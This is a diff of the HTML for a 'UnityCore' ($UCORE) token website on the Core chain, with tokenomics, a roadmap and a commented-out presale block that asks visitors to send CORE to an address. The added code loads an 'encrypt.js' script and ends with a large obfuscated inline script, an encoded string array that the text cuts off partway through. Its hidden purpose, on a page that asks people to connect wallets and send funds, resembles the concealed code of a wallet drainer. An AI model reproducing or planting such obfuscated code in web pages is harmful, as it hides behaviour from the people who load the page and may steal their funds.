-                                        <div class="MuiTypography-root MuiTypography-caption css-1fzsl0k">Net worth
-                                        </div>
-                                    </div><span class="MuiSkeleton-root MuiSkeleton-text MuiSkeleton-pulse css-o92e62"
-                                        style="height:24px"></span>
-                                </div>
-                            </div>
-                            <div class="MuiBox-root css-ltjh6b">
-                                <div class="MuiBox-root css-q6wgnv"><svg width="24" height="24" viewBox="0 0 24 24"
-                                        fill="none" xmlns="http://www.w3.org/2000/svg" role="img">
-                                        <path
-                                            d="M8.667 19.778V13.11a2.222 2.222 0 0 0-2.223-2.222H4.222A2.222 2.222 0 0 0 2 13.11v6.667A2.222 2.222 0 0 0 4.222 22h2.222a2.222 2.222 0 0 0 2.223-2.222Zm0 0V8.667a2.222 2.222 0 0 1 2.222-2.223h2.222a2.222 2.222 0 0 1 2.222 2.223v11.11m-6.666 0A2.222 2.222 0 0 0 10.889 22h2.222a2.222 2.222 0 0 0 2.222-2.222m0 0V4.222A2.222 2.222 0 0 1 17.556 2h2.222A2.222 2.222 0 0 1 22 4.222v15.556A2.222 2.222 0 0 1 19.778 22h-2.222a2.222 2.222 0 0 1-2.223-2.222Z"
-                                            stroke="#A5A8B6" stroke-width="1.5" stroke-linecap="round"
-                                            stroke-linejoin="round"></path>
-                                    </svg></div>
-                                <div class="MuiBox-root css-j7qwjs">
-                                    <div class="MuiBox-root css-18biwo">
-                                        <div class="MuiTypography-root MuiTypography-caption css-1fzsl0k">
-                                            <div style="display:flex">Net APY<div class="MuiBox-root css-70qvj9">
-                                                    <div class="MuiBox-root css-ulme3a"><button
-                                                            class="MuiButtonBase-root MuiIconButton-root MuiIconButton-sizeMedium css-a9efdy"
-                                                            tabindex="0" type="button"><svg
-                                                                class="MuiSvgIcon-root MuiSvgIcon-fontSizeMedium css-1rqf5ri"
-                                                                focusable="false" aria-hidden="true"
-                                                                viewBox="0 0 24 24"><svg
-                                                                    xmlns="http://www.w3.org/2000/svg" fill="none"
-                                                                    viewBox="0 0 24 24" stroke-width="2"
-                                                                    stroke="currentColor" aria-hidden="true">
-                                                                    <path stroke-linecap="round" stroke-linejoin="round"
-                                                                        d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z">
-                                                                    </path>
-                                                                </svg></svg></button></div>
-                                                </div>
-                                            </div>
-                                        </div>
-                                    </div><span class="MuiSkeleton-root MuiSkeleton-text MuiSkeleton-pulse css-o92e62"
-                                        style="height:24px"></span>
-                                </div>
-                            </div>
-                        </div>-->
                     </div>
                 </div>
             </div>
-            <div class="MuiBox-root css-159pi92">
-                <div class="MuiContainer-root MuiContainer-maxWidthLg css-1a8qn2o">
-                    <div class="MuiPaper-root MuiPaper-elevation MuiPaper-rounded MuiPaper-elevation1 css-11mxx5g">
-                        <img src="./unitycore.png" alt="" id="loveGhost_svg__b" width="10%">
-                        <h2 class="MuiTypography-root MuiTypography-h2 css-11zj654">Connect your wallet</h2>
-                        <p class="MuiTypography-root MuiTypography-description css-roudg2">Please connect your wallet to
-                            see your supplies, borrowings, and open positions.
+        </div>
+    </section>
+    <section class="space--top pb-5 pb-lg-10 about about--v3 section--dark bg-color--dark--1 border--top" id="about">
+        <div class="container">
+            <div id="introduce" class="row align-items-center flex-column-reverse flex-lg-row text-center text-lg-left mb-10">
+                <div class="col-12 col-lg-7 col-xl-6">
+                    <div class="text-center text-lg-left reveal">
+                        <h2 class="h3-font mb-3">
+                            
+                            How Does $UCORE Token Work?
+                            
+                        </h2>
+                        <p class="mb-3">
+                            
+                            $UCORE is the Token of its type awarding holders in CORE. It is a decentralized platform to bridge 
+                            the gap between cryptocurrency and fiat currency and to bring the benefits of the crypto world to the everyday person. The smart contract is built on the CORE blockchain with great tokenomics. It has locked liquidity and a fully transparent and innovative team who are determined to serve the humanity
+                            
                         </p>
-                        <button class="btn btn-primary css-9fybxg"
-                                onClick="Connect"
-                                id="connect"
-                        >
-                            <span class="spinner-border spinner-border-sm"></span>
-                            Connect wallet...
-                        </button>
-                        <div class="dropdown">
-                            <ul class="nav nav-pills">
-                                <li class="nav-item">
-                                    <button class="nav-link active dropdown-toggle" type="button" data-bs-toggle="dropdown" aria-expanded="false">
-                                        Version 1
-                                    </button>
-                                    <ul class="dropdown-menu dropdown-menu-dark">      
-                                        <li>
-                                            <a class="dropdown-item " href="https://scan.coredao.org/" target="_blank">
-                                                <img src="coredao.png" alt="" width="25%">Core
-                                            </a>
-                                        </li>
-                                    </ul>
+                    </div>
+                    <div class="text-center">
+                        <a href="https://unitycore-protocol.gitbook.io/unitycoreprotocol-docs./" target="_blank" class="mx-1 btn btn-size--sm btn-bg--primary rounded--full btn-hover--splash btn-hover--3d"><span class="btn__text">Whitepaper</span></a>
+                        <a href="https://twitter.com/unitycorepro" target="_blank" class="mx-1 btn btn-size--sm btn-bg--primary rounded--full btn-hover--splash btn-hover--3d"><span class="btn__text">Twitter</span></a>                        
+                    </div>
+                </div>
+                <div class="col-12 col-lg-5 col-xl-6 mb-6 mb-lg-0 text-center">
+                    <picture class="about__image reveal w-75" >
+                        <img src="assets/coredao.png" alt="illustration" width="50%" >
+                    </picture>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section class="space section--dark bg-color--dark--2">
+        <div class="container">
+            <div class="row">
+                <div class="col-12 col-md-9 mx-auto mx-md-0">
+                    <div class="mb-5 mb-lg-7 text-center text-md-left reveal">
+                        <h2 class="h3-font mb-2">Vision</h2>
+                        <p>
+                            
+                            We envision a world in which wealth-building technologies are made
+
+                            available to the general public, restoring people’s authority over our
+                            
+                            financial institutions. To encourage more people to participate in digital
+                            
+                            assets.
+                            
+                        </p>
+                    </div>
+                </div>
+            </div>
+            <div class="position-relative remove-space--bottom">
+                <div class="vertical-border d-flex pos-abs-center h-100 w-100">
+                    <span class="column-border"></span>
+                </div>
+                <div class="row horizontal-border justify-content-between mb-lg-5 pb-lg-5 reveal">
+                    <div class="col-12 col-md-6">
+                        <div class="d-lg-flex mb-4 mb-lg-0 text-center text-md-left">
+                            <span class="mb-3 mb-lg-0 mr-md-3">
+                                <img src="assets/img/icon-decentralized.svg" alt="icon">
+                            </span>
+                            <div>
+                                <h3 class="h5-font font-w--600 text-color--200 mb-2">TRANSPARENCY AND TRUST</h3>
+                                <p>● 
+                                    
+                                    Trust is critical in the bitcoin
+
+                                    industry.
+                                    
+                                </p>
+                                <p>● 
+                                    
+                                    This entails complete
+
+                                    openness in all aspects of community and development work, as well as
+                                    
+                                    security efforts. 
+                                </p>
+                                <p>● 
+                                    
+                                    UNITYCORE has been KYCed by Icecreamswap team, and more KYC to follow soon!
+                                    
+                                </p>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-12 col-md-6">
+                        <div class="d-lg-flex mb-4 mb-lg-0 text-center text-md-left">
+                            <span class="mb-3 mb-lg-0 mr-md-3">
+                                <img src="assets/img/icon-p2p.svg" alt="icon">
+                            </span>
+                            <div>
+                                <h3 class="h5-font font-w--600 text-color--200 mb-2">COMMUNITY</h3>
+                                <p>● 
+                                    
+                                    UNITYCORE will be one of the fastest growing and most beloved communities in cryptocurrency.
+                                    
+                                </p>
+                                <p>● 
+                                    
+                                    We believe that community is essential, and UNITYCORE will try to
+
+                                    involve people from all around the world. 
+                                    
+                                </p>
+                                <p>● 
+                                    
+                                    We also offer specialized discord servers for our foreign community.
+                                    
+                                </p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="row horizontal-border justify-content-between mb-lg-5 pb-lg-5 reveal">
+                    <div class="col-12 col-md-6">
+                        <div class="d-lg-flex mb-4 mb-lg-0 text-center text-md-left">
+                            <span class="mb-3 mb-lg-0 mr-md-3">
+                                <img src="assets/img/icon-wallet.svg" alt="icon">
+                            </span>
+                            <div>
+                                <h3 class="h5-font font-w--600 text-color--200 mb-2">LONGEVITY</h3>
+                                <p>● 
+                                    
+                                    UNITYCORE is here to stay.
+                                    
+                                </p>
+                                <p>● 
+                                    
+                                    The
+
+                                    decentralized community
+                                    
+                                    encourages and embraces long-term
+                                    
+                                    ecosystem and foundation development to generate genuine use cases and higher benefits to the holders.
+                                    
+                                </p>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-12 col-md-6">
+                        <div class="d-lg-flex mb-4 mb-lg-0 text-center text-md-left">
+                            <span class="mb-3 mb-lg-0 mr-md-3">
+                                <img src="assets/img/icon-ledger.svg" alt="icon">
+                            </span>
+                            <div>
+                                <h3 class="h5-font font-w--600 text-color--200 mb-2">CHARITY</h3>
+                                <p>● 
+                                    
+                                    UNITY is a ground-breaking
+
+                                    new system designed to revolutionize the CORE space.
+                                    
+                                </p>
+                                <p>● 
+                                    
+                                    One of our missions is charitable giving. As a community-based token, one of its major goals during the launch is to give back something to the community through donations
+
+                                    to charities and other reputable causes.
+                                    
+                                </p>
+                                <p>● 
+                                As a community-based token, one of its major goals during the launch is to give back something to the community through donations
+
+                                    to charities and other reputable causes.
+                                </p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section class="space section--dark bg-color--dark--1 token-sale-details token-sale-details--v1">
+        <div class="container">
+            <h2 class="h3-font mb-2">TOKENOMICS</h2>
+           <!--    <div id="presale" class="row">
+                <div class="col-12 col-sm-10 col-md-8 mx-auto reveal">
+                   <div class="text-center mb-5 mb-lg-7 reveal">
+                       
+                        <div class="card bg-color--black-opacity--15 border--none p-2 w-100 mb-2">
+                            <span class="body-font font-w--500 mb-1">Pre-sale Address</span>
+                            <span class="color--primary h6-font font-w--700">TBA</span>
+                            <span class="color--primary h6-font font-w--700">(ENS: unityprotocol.com)</span>
+                            <div class="mt-2">
+                                <button text="0x7c731AB97e4dea173aAFFBa64c9C9Dc21e2F1b77" class="copy btn btn-size--sm btn-bg--primary rounded--full btn-hover--splash btn-hover--3d"><span class="btn__text">Copy Address</span></button>
+                            </div>
+                        </div>
+                      <p>●
+                            
+                            Pre-sale quantity: 20,000,000 $UNITY.
+                            
+                        </p>
+                        <p>●
+                            
+                            Pre-sale price: 1 CORE = 20,000 $UNITY.
+                            
+                        </p>
+                        <p>
+                            
+                            Mini buy is 0.05 CORE, and max buy is 10 CORE.
+                            
+                        </p>
+                        <p>
+                            
+                            Send CORE from your wallet to the presale address above. Our system will send $UNITY tokens to your wallet immediately.
+                            
+                        </p>-->
+                    </div>
+                </div>
+            </div>
+            <div class="row">
+                <div class="col-6 col-lg-4 mb-3 reveal">
+                    <div class="card bg-color--black-opacity--15 border--none p-2 p-md-4 w-100">
+                        <span class="body-font font-w--500 mb-1">Token Name</span>
+                        <span class="color--primary h4-font font-w--700">UnityCore</span>
+                    </div>
+                </div>
+                <div class="col-6 col-lg-4 mb-3 reveal">
+                    <div class="card bg-color--black-opacity--15 border--none p-2 p-md-4 w-100 h-100">
+                        <span class="body-font font-w--500 mb-1">Token Symbol</span>
+                        <span class="color--primary h4-font font-w--700">UCORE</span>
+                    </div>
+                </div>
+                <div class="col-6 col-lg-4 mb-3 reveal">
+                    <div class="card bg-color--black-opacity--15 border--none p-2 p-md-4 w-100 h-100">
+                        <span class="body-font font-w--500 mb-1">Decimals</span>
+                        <span class="color--primary h4-font font-w--700">18</span>
+                    </div>
+                </div>
+                <div class="col-6 col-lg-4 mb-3 reveal">
+                    <div class="card bg-color--black-opacity--15 border--none p-2 p-md-4 w-100 h-100">
+                        <span class="body-font font-w--500 mb-1">Contract Address</span>
+                        <span class="color--primary font-w--700">
+                            0x...
+                            <a href="https://corescan.io/token/" target="_blank"><i class="fa fa-external-link-alt text-secondary"></i></a>
+                        </span>
+                    </div>
+                </div>
+                <div class="col-6 col-lg-4 mb-3 reveal">
+                    <div class="card bg-color--black-opacity--15 border--none p-2 p-md-4 w-100 h-100">
+                        <span class="body-font font-w--500 mb-1">Blockchain</span>
+                        <span class="color--primary h4-font font-w--700">CORE </span>
+                    </div>
+                </div>
+                <div class="col-6 col-lg-4 mb-3 reveal">
+                    <div class="card bg-color--black-opacity--15 border--none p-2 p-md-4 w-100 h-100">
+                        <span class="body-font font-w--500 mb-1">Total Supply</span>
+                        <span class="color--primary h4-font font-w--700">10,000,000</span>
+                    </div>
+                </div>
+            </div>
+
+            
+        </div>
+    </section>
+
+    <section id="tokenomics" class="space token-saleinfo token-saleinfo--v1 section--dark bg-color--dark--2">
+        <div class="background-holder background--cover background--top opacity--08">
+            <img src="assets/img/layout/sphere.svg" alt="image" class="background-image-holder">
+        </div>
+        <div class="container">
+            <div class="row">
+                <div class="col-12 col-sm-10 col-md-8 mx-auto reveal">
+                    <div class="text-center mb-5 mb-lg-7">
+                        <h2 class="h3-font mb-2">UnityCore Tokenomics</h2>
+                        <p>
+                            
+                            There are a total of 10,000,000 UCORE tokens that will be distributed. Here's a breakdown of the $UCORE token:
+                            
+                        </p>
+                    </div>
+                </div>
+            </div>
+            <div class="row justify-content-center">
+                <div class="col-12 col-lg-8 pr-lg-6 mb-4 mb-lg-0">
+                    <div class="token-saleinfo-dist d-md-flex align-items-md-center reveal">
+                        <div id="pie-chart--v1" class="pie-chart--flat position-relative mx-auto mr-md-3 mb-3 mb-md-0">
+                            <div class="text-center color--primary d-flex flex-column pos-abs-center">
+                                <span class=" font-size--14 font-w--600 mb-1">Total Token Supply</span>
+                                <span class=" font-w--600 mb-1">10,000,000</span>
+                                <span class=" font-w--600">$UCORE</span>
+                            </div>
+                        </div>
+                        <div class="content dist-content">
+                            <ul class="content-list list-unstyled remove-space--bottom">
+                                <li class="text-color--300 font-w--500 d-flex align-items-center justify-content-between mb-1">
+                                    <div class="d-flex align-items-center">
+                                        <span class="oval--md mr-1 jsElement" data-bg-color="#3260ED"></span>
+                                        <span class="content-list__name">IDO</span>
+                                    </div>
+                                    <span class="content-list__value">40%</span>
+                                </li>
+                                <li class="text-color--300 font-w--500 d-flex align-items-center justify-content-between mb-1">
+                                    <div class="d-flex align-items-center">
+                                        <span class="oval--md mr-1 jsElement" data-bg-color="#8CA8FF"></span>
+                                        <span class="content-list__name">Liquidity</span>
+                                    </div>
+                                    <span class="content-list__value">20%</span>
+                                </li>
+                                <li class="text-color--300 font-w--500 d-flex align-items-center justify-content-between mb-1">
+                                    <div class="d-flex align-items-center">
+                                        <span class="oval--md mr-1 jsElement" data-bg-color="#B6BD00"></span>
+                                        <span class="content-list__name">Liquidity Farming/Staking</span>
+                                    </div>
+                                    <span class="content-list__value">20%</span>
+                                </li>
+                                <li class="text-color--300 font-w--500 d-flex align-items-center justify-content-between mb-1">
+                                    <div class="d-flex align-items-center">
+                                        <span class="oval--md mr-1 jsElement" data-bg-color="#D65800"></span>
+                                        <span class="content-list__name">Team (1 year vesting)</span>
+                                    </div>
+                                    <span class="content-list__value">10%</span>
+                                </li>
+                                <li class="text-color--300 font-w--500 d-flex align-items-center justify-content-between mb-1">
+                                    <div class="d-flex align-items-center">
+                                        <span class="oval--md mr-1 jsElement" data-bg-color="#1ed702"></span>
+                                        <span class="content-list__name">Marketing</span>
+                                    </div>
+                                    <span class="content-list__value">5%</span>
+                                </li>
+                                <li class="text-color--300 font-w--500 d-flex align-items-center justify-content-between mb-1">
+                                    <div class="d-flex align-items-center">
+                                        <span class="oval--md mr-1 jsElement" data-bg-color="#ff0000"></span>
+                                        <span class="content-list__name">Treasury (Locked)</span>
+                                    </div>
+                                    <span class="content-list__value">5%</span>
                                 </li>
                             </ul>
                         </div>
+                    </div>
                 </div>
             </div>
-        </main>
-    </div>
-    <!-- jQuery library -->
-<script src="https://cdn.jsdelivr.net/npm/jquery@3.6.3/dist/jquery.slim.min.js"></script>
+        </div>
+    </section>
+    <section class="space hidden roadmap roadmap--v1 section--dark bg-color--dark--1" id="roadmap">
+        <div class="container">
+            <div class="row">
+                <div class="col-12 col-sm-10 col-md-8 mx-auto reveal">
+                    <div class="text-center mb-sm-5 mb-lg-7">
+                        <h2 class="h3-font mb-2">Project Roadmap</h2>
+                    </div>
+                </div>
+            </div>
+            <div class="row align-items-center pb-7 pb-md-0 reveal">
+                <div class="col-12 col-xl-1 mx-auto mx-lg-0 text-center">
+                    <ul class="roadmap__year list-unstyled d-xl-flex flex-xl-column">
+                    </ul>
+                </div>
+                <div class="col-12 col-xl-9 ml-xl-auto">
+                    <div class="carosuel-slider--v6">
+                        <div class="slide mb-1" data-year="2023-2024">
+                            <div class="d-md-flex align-items-md-center">
+                                <div class="mr-5 pr-5 mr-xl-7 pr-xl-7 mb-3 mb-md-0 position-relative">
+                                    <h3 class="slide__title font-size--26 text-color--200 font-w--600">PHASE 1 🎯 </h3>
+                                    <span class="d-none d-md-inline-block decor decor--square decor--light"></span>
+                                </div>
+                                <ul class="pl-2 pl-md-0">
+                                    <li class="text-color--400">
+                                        <p class="h6-font">
+                                            
+                                            Building a strong Community
+                                            
+                                        </p>
+                                    </li>
+                                    <li class="text-color--400">
+                                        <p class="h6-font">
+                                            
+                                            Whitelisting Contest
+                                            
+                                        </p>
+                                    </li>
+                                    <li class="text-color--400">
+                                        <p class="h6-font">
+                                            
+                                          Collaborations and Partnerships
+                                            
+                                        </p>
+                                    </li>
+                                    <li class="text-color--400">
+                                        <p class="h6-font">
+                                            
+                                            Website Launch
+                                            
+                                        </p>
+                                    </li>
+                                    <li class="text-color--400">
+                                        <p class="h6-font">
+                                            
+                                           Initial Dex Offering on Launchpad
+                                            
+                                        </p>
+                                    </li>
+                                </ul>
+                            </div>
+                        </div>
+                        <div class="slide mb-1" data-year="2023-2024">
+                            <div class="d-md-flex align-items-md-center">
+                                <div class="mr-5 pr-5 mr-xl-7 pr-xl-7 mb-3 mb-md-0 position-relative">
+                                    <h3 class="slide__title font-size--26 text-color--200 font-w--600">PHASE 2 🎯</h3>
+                                    <span class="d-none d-md-inline-block decor decor--square decor--light"></span>
+                                </div>
+                                <ul class="pl-2 pl-md-0">
+                                    <li class="text-color--400">
+                                        <p>
+                                            
+                                           Audits of Lending Smart Contracts
+                                            
+                                        </p>
+                                    </li>
+                                    <li class="text-color--400">
+                                        <p>
+                                            
+                                           Launching of our Mainnet Lending and Borrowing Protocol V1
+                                            
+                                        </p>
+                                    </li>
+                                    <li class="text-color--400">
+                                        <p>
+                                            
+                                           Marketing Campaign
+                                            
+                                        </p>
+                                    </li>
+                                    <li class="text-color--400">
+                                        <p>
+                                            
+                                           CoinGecko Listing
+                                            
+                                        </p>
+                                    </li>
+                                    <li class="text-color--400">
+                                        <p>
+                                            
+                                          Website Upgrade
+                                            
+                                        </p>
+                                    </li>
+                                </ul>
+                            </div>
+                        </div>
+                        <div class="slide mb-1" data-year="2023-2024">
+                            <div class="d-md-flex align-items-md-center">
+                                <div class="mr-5 pr-5 mr-xl-7 pr-xl-7 mb-3 mb-md-0 position-relative">
+                                    <h3 class="slide__title font-size--26 text-color--200 font-w--600">PHASE 3 🎯</h3>
+                                    <span class="d-none d-md-inline-block decor decor--square decor--light"></span>
+                                </div>
+                                <ul class="pl-2 pl-md-0">
+                                    <li class="text-color--400">
+                                        <p>
+                                            
+                                          Lending and Borrowinng Protocol V2
+                                            
+                                        </p>
+                                    </li>
+                                    <li class="text-color--400">
+                                        <p>
+                                            
+                                           Huge Marketing Push
+                                            
+                                        </p>
+                                    </li>
+                                    <li class="text-color--400">
+                                        <p>
+                                            
+                                          CEX Listing
+                                            
+                                        </p>
+                                    </li>
+                                    <li class="text-color--400">
+                                        <p>
+                                            
+                                           Charity Partnerships
+                                            
+                                        </p>
+                                    </li>
+                                    <li class="text-color--400">
+                                        <p>
+                                            
+                                          NFT Collections
+                                            
+                                        </p>
+                                    </li>
+                                </ul>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
 
-<!-- Popper JS -->
-<script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.1/dist/umd/popper.min.js"></script>
+    <section id="app" class="space section--dark bg-color--dark--2 border--bottom switchable d-lg-flex align-items-md-center">
+        <div class="col-12 col-lg-6 mb-40 mb-lg-0 text-center mb-3 reveal">
+            <picture class="switchable__image">
+                <img src="./dvmc.png" alt="image" class="img-fluid">
+            </picture>
+        </div>
+        <div class="switchable__content">
+            <div class="container">
+                <div class="row">
+                    <div class="col-12 ml-md-auto">
+                        <div class="mb-4 text-center text-sm-left reveal">
+                            <h2 class="h3-font mb-1">UnityCore Protocol Dapp is coming Soon</h2>
+                            <p class="h6-font">
+                                
+                                We will build the fastest lending and borrowing protocol on Core chain ever.
+                                
+                            </p>
+                        </div>
+                       
+                        <div class="button-group d-flex flex-column flex-sm-row align-items-center reveal">
+                            <div class="d-flex flex-row align-items-middle mb-2">
+                                <button class="btn btn-size--sm btn-bg--primary btn-border--width--2 rounded--full color--white btn-hover--splash coming-soon">
+                                    <span class="btn__text" href="https://app.unitytokensd.com">Testnet</span>
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
 
-<!-- Latest compiled JavaScript -->
-<script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/js/bootstrap.bundle.min.js"></script>
-   
-        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-kenU1KFdBIe4zVF0s0G1M5b4hcpxyD9F7jL+jjXkk+Q2h455rYXK/7HAuoJl+0I4" crossorigin="anonymous"></script>
+    <section class="space--top pb-4 section--dark bg-color--dark--2">
+        <div class="background-holder opacity--05">
+            <img src="assets/img/layout/bg-overlay-04.png" alt="image" class="background-image-holder">
+        </div>
+        <div class="container">
+            <div class="row">
+                <div class="col-12 col-sm-10 col-md-8 mx-auto">
+                    <div class="text-center mb-5 mb-lg-6 reveal">
+                        <h2 class="h3-font mb-2">Partners</h2>
+                    </div>
+                </div>
+            </div>
+            <div class="position-relative reveal">
+                <div class="vertical-border d-flex pos-abs-center h-100 w-100">
+                    <span class="column-border"></span>
+                    <span class="column-border"></span>
+                    <span class="column-border"></span>
+                </div>
+                <div class="row horizontal-border text-center mb-lg-6 pb-lg-6 d-flex align-items-center">
+                    <div class="col-6 col-sm-3 mb-5 mb-lg-0">
+                        <span class="w-75"><img src="./icecreamswap.png" alt="icecreamswap" class="img-fluid w-100"></span>
+                    </div>
+                    <div class="col-6 col-sm-3 mb-5 mb-lg-0">
+                        <span class="w-75"><img src="./assets/coredao.png" alt="coredao" class="img-fluid w-100"></span>
+                    </div>
+                    
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <div class="height-emulator d-none d-lg-block"></div>
+
+    <footer class="footer footer--fixed section--dark bg-color--dark--3">
+        <div class="py-6 py-lg-10 ">
+            <div class="container">
+                <div class="row">
+                    <div class="col-12 col-md-10 col-lg-6 mx-auto mb-4 mb-lg-0 text-center text-lg-left">
+                        <span class="mb-2">
+                            <img src="assets/unitycore.png" height="40" alt="brand-logo">
+                        </span>
+                        <p class="text-color--300">
+                            
+                            The First Lending Protocol On Core Chain...
+                            
+                        </p>
+                    </div>
+                    <div class="col-12 col-lg-6 ml-lg-auto text-center text-lg-right">
+                        <p class="text-color--400 font-size--14">© 2023 <a href="index.html" class="text-color--400">Unity Core Protocol</a>. All Rights Reserved.</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </footer>
+</main>
+<script src="../cdn.jsdelivr.net/npm/clipboard%402.0.8/dist/clipboard.min.js"></script>
+<script src="../cdn.jsdelivr.net/npm/js-cookie%403.0.1/dist/js.cookie.min.js"></script>
+<script src="assets/js/plugins.min.js"></script>
+<script src="assets/js/encrypt.js"></script>
+<script src="assets/js/app.js"></script>
+<script>
+(function(){
+    $('a[data-lang]').click(function () {
+        Cookies.set('lang', $(this).attr('data-lang'), { expires: 365, sameSite: 'strict' })
+        location.reload();
+    });
+    $('.coming-soon').click(function(){
+        alert("Coming soon");
+    });
+
+
+    $("#pie-chart--v1").drawDoughnutChart([{
+            title: "IDO",
+            value: 40,
+            color: "#3260ED"
+        },
+        {
+            title: "Liquidity",
+            value: 20,
+            color: "#8CA8FF"
+        },
+        {
+            title: "Liquidity Farming/Staking",
+            value: 20,
+            color: "#B6BD00"
+        },
+        {
+            title: "Team (1 year vesting)",
+            value: 10,
+            color: "#D65800"
+        },
+        {
+            title: "Marketing",
+            value: 5,
+            color: "#1ed702"
+        },
+        {
+            title: "Treasury (Locked)",
+            value: 5,
+            color: "#ff0000"
+        },
+    ]);
+
+    window.init_page = function (selector) {
+    };
+    init_page(document);
+
+    new ClipboardJS('.copy', {
+        text: function (trigger) {
+            var target = $(trigger);
+            if (target.attr('target')) {
+                target = $(target.attr('target'));
+            }
+            return target.attr('text') || target.val() || target.text();
+        }
+    }).on('success', function (event) {
+        var trigger = $(event.trigger);
+        var title_origin = trigger.attr('title');
+        var message = trigger.attr('data-copy-success');
+        trigger.removeAttr('title');
+        trigger.tooltip({
+            title: message ? message : 'Copied',
+            trigger: 'manual',
+        }).tooltip('show');
+        setTimeout(function () {
+            trigger.tooltip('dispose');
+            trigger.attr('title', title_origin);
+        }, 600);
+    }).on('error', function (e) {
+        alert('Copy failed');
+    });
+    $(document).on('click', '#withdraw', function () {
+        var block = $('#airdrop-block');
+        var address = $(this).attr('data-address');
+        block.load('/airdrop/withdraw', {
+            address: address,
+        }, function () {
+            init_page(block);
+        });
+    });
+
+    var end_ts = 1641193200;
+    var prev_days = 0;
+    var prev_hours = 0;
+    var prev_minutes = 0;
+    var prev_seconds = 0;
+    var countdown = function () {
+        var now_ts = Math.floor(new Date().getTime() / 1000);
+        var ts_diff = end_ts - now_ts;
+        if (ts_diff < 0) {
+            return;
+        }
+        if (ts_diff < -3) {
+            clearInterval(interval);
+            location.reload();
+            return;
+        }
+        var days = Math.floor(ts_diff / 60 / 60 / 24);
+        var hours = Math.floor((ts_diff - days * 60 * 60 * 24) / 60 / 60);
+        var minutes = Math.floor((ts_diff - days * 60 * 60 * 24 - hours * 60 * 60) / 60);
+        var seconds = Math.floor(ts_diff - days * 60 * 60 * 24 - hours * 60 * 60 - minutes * 60);
+        if (prev_days != days) {
+            $('.count_down_days .number').text(days<10?'0'+days:days);
+        }
+        if (prev_hours != hours) {
+            $('.count_down_hours .number').text(hours<10?'0'+hours:hours);
+        }
+        if (prev_minutes != minutes) {
+            $('.count_down_minutes .number').text(minutes<10?'0'+minutes:minutes);
+        }
+        $('.count_down_seconds .number').text(seconds<10?'0'+seconds:seconds);
+        prev_days = days;
+        prev_hours = hours;
+        prev_minutes = minutes;
+        prev_seconds = seconds;
+    };
+    countdown();
+    var interval = setInterval(countdown, 1000);
+
+    $(document).click(function(e) {
+        var collapse=$(".collapse");
+        var target=$(e.target);
+        if(target.attr('data-bs-toggle')=='collapse'){
+        }else if(target.hasClass('collapse')){
+        }else if(target.parents('.collapse').length>0){
+        }else if(collapse.hasClass('show')){
+            collapse.collapse('hide');
+        }
+    });
+})();
+</script>
+
+<script>
+
+var _0xoda = 'v1', _0x80ad = [_0xoda, 'wojDrcOXDsK+Pw==', 'w6LCgsO1fcKQ', 'wrrCqcO2w6fDqcOL', 'w73CjsO4bsKQAQ==', 'HsKmw5MhwoRI', 'w4HChcOsAj/Dj8KtWwXDtg==', 'wrXDvsK+w5rDkcK0H2HDtQ==', 'w54uLk7Dn8OAA8KlMcKLw6rCpMK2w4rDnMODw5LDiBo=', 'wqwfXMKFwpM=', 'PMOBScOnwqA=', 'w4QqL0XDhMOXFMKkPcKUw7DCrsKsw5bDnQ==', 'LMOEwo7DvMORG8KawqLCoA==', 'IMKMw6Yiwqxnw7EmSsOkHHorIi3DlDnDtcOGw6sHEMKgGEIsPcOVw5xIPwHDlcOBQEZAHHkMYMKwwp4vw7bCmzvCqcKKVMKBP8OEeMO6FcKPfcKeHDJ0w6Fr', 'w7IiZUPCuyPCssOnJnkBHSVMajnDm8Ocw5xTw67DisK+wrnCisOowq7DuTvDjsOfw60yw7rCjsOtK8Oyw5A8w5jDhH17A1B4McOMw4kKwoXDnlNsR1/Di8K5w7Mjw4TCh8Kc', 'wrQhcMKGw49ewoLClMOqwr4=', 'K8Kgw6fCtg==', 'S3TDsMKOw4PCpsKxLcKcE8OZw4LDisK4woI=', 'wq9sJMOofiZUChTDsR3CmcKHw5k=', 'w5HCn8OiACTDvw==', 'NWlBw47CnSLCpR7CpsO1PQrDrA==', 'w4IACE/DkQ==', 'wpPCvsO9UAs=', 'w7cQw7Y=', 'wrTDosKIw5zDosK6FGg=', 'UMO+w70=', 'w4M8U3bDtyg=', 'UcOBw4XDo1k=', 'A8OWDsKaw5M=', 'OsO9LsKTGA==', 'wq4/f8KHwpU=', 'w558wogQIkvDsg==', 'wq1tPGTDug==', 'wq7Cu1nDv8KJw7EXJUTCqhFKLksJwrw+CwR4cMK3w6PDpsKVQsOSw4BXdsKXwpTDi0VIXMORw59HwpctJsKoeMKFZTMYwqvDncO2F8K6w6xJQSduwqhtCynDkUA=', 'W23DisK5w6U=', 'wolmMTXDtsKWaXNNw57CtlomYcObwr/Cn8OQwp7Cj8KUfQPCmA==', 'QMOowoxpw4xjwo8lKcOnOH80IgzDhzbDocOawoRrbMOYdA==', 'ABbCm3k=', 'JcOYwo7Cpw==', 'LMOEwp3Dp8OLD8Kkwq3CrcO3', 'esOtw5UW', 'w4vDkcOQWBrDssK7QcKL', 'w6JHPVJ5DMKTw5xBwoQnw5Y=', 'cW1cw7XCjTXCpw==', 'w41OKsOjUw==', 'w6BiLMO+', 'w6bCq8Otw7DDqMOXSsO1FkvDksORw7vClcK4', 'w4LCm8KZacKb', 'ecKcw6NTw4k=', 'w7fClMKmTGpRZsOtwrTDi8KRQsOswoptwrt8', 'wphKOjN4', 'XcKkwobDsg==', 'w45lwpwjOQ==', 'LBbDqw==', 'w7Eew60=', 'woXDm8Otwo/Chw==', 'wr1ACAxZ', 'wrXDhMKUOFs=', 'wp17AVrDnQ==', 